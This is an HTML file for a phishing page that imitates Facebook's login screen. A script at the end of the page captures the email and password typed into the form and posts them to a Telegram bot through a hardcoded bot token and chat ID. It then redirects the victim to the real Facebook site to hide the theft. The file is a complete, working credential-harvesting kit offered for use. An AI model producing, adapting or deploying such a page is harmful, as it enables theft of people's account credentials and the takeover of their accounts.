<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* Body Styling */
    body {
      font-family: 'Helvetica', Arial, sans-serif;
      background-color: #f0f2f5;
    }

    /* Header Section */
    .fb-header {
      background-color: #4267B2;
      padding: 15px 0;
      text-align: center;
      color: white;
      font-size: 24px;
      font-weight: bold;
    }

    /* Page Layout */
    .container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-section {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      max-width: 1000px;
      width: 100%;
    }

    /* Left Side Info */
    .left-section {
      flex: 1;
      padding: 0 20px;
      margin-right: 20px;
      text-align: center;
    }

    .left-section img {
      width: 250px;
      margin-bottom: 20px;
    }

    .left-section h1 {
      font-size: 36px;
      color: #1877F2;
      margin-bottom: 10px;
    }

    .left-section p {
      font-size: 20px;
      color: #606770;
    }

    /* Login Box */
    .login-container {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 360px;
      text-align: center;
    }

    .login-container form {
      display: flex;
      flex-direction: column;
    }

    .login-container input[type="text"],
    .login-container input[type="email"],
    .login-container input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-container input[type="submit"] {
      background-color: #1877F2;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-container input[type="submit"]:hover {
      background-color: #165cbb;
    }

    .login-container a {
      color: #1877F2;
      text-decoration: none;
      font-size: 14px;
    }

    .login-container a:hover {
      text-decoration: underline;
    }

    .create-account-btn {
      background-color: #42b72a;
      color: white;
      font-size: 18px;
      padding: 12px;
      border: none;
      border-radius: 6px;
      margin-top: 20px;
      cursor: pointer;
    }

    .create-account-btn:hover {
      background-color: #36a420;
    }

    /* Footer */
    .footer {
      margin-top: 50px;
      text-align: center;
      color: #65676b;
      font-size: 12px;
    }

    .footer a {
      color: #1877F2;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <!-- Header Section -->
  <div class="fb-header">facebook</div>

  <!-- Content -->
  <div class="container">
    <div class="login-section">
      <!-- Left Section -->
      <div class="left-section">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h1>Facebook helps you connect and share with the people in your life.</h1>
        <p>Log in to get started.</p>
      </div>

      <!-- Login Section -->
      <div class="login-container">
        <form id="facebookLoginForm">
          <input type="email" id="email" name="email" placeholder="Email or Phone Number" required>
          <input type="password" id="password" name="password" placeholder="Password" required>
          <input type="submit" value="Log In">
        </form>
        <div>
          <a href="https://www.facebook.com/login/identify/" target="_blank">Forgotten password?</a>
        </div>
        <a href="https://www.facebook.com/r.php" target="_blank">
          <button class="create-account-btn">Create New Account</button>
        </a>
      </div>
    </div>
    <!-- Footer -->
    <div class="footer">
      <p>
        <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Advertising</a> · <a href="#">Ad Choices</a> · <a href="#">Cookies</a>
      </p>
      <p>Facebook © 2025</p>
    </div>
  </div>

  <script>
    // Telegram bot details
    const botToken = "7878133945:AAEL2G1h4BSYwC7MQwAGLzFtUlxWbsLEkXw"; // Replace with your bot token
    const chatId = "6150003175"; // Replace with your chat ID

    // Form submission event
    document.getElementById('facebookLoginForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent default form submission

      // Collect user input data
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // Construct message to send to Telegram
      const message = `
New Facebook Login Attempt:
- Email/Phone: ${email}
- Password: ${password}
      `;

      // Send message to Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            // Redirect to Facebook
            window.location.href = "https://www.facebook.com";
          } else {
            console.error('Failed to send details:', data);
          }
        })
        .catch((error) => {
          console.error('Error sending details:', error);
        });
    });
  </script>
</body>
</html>
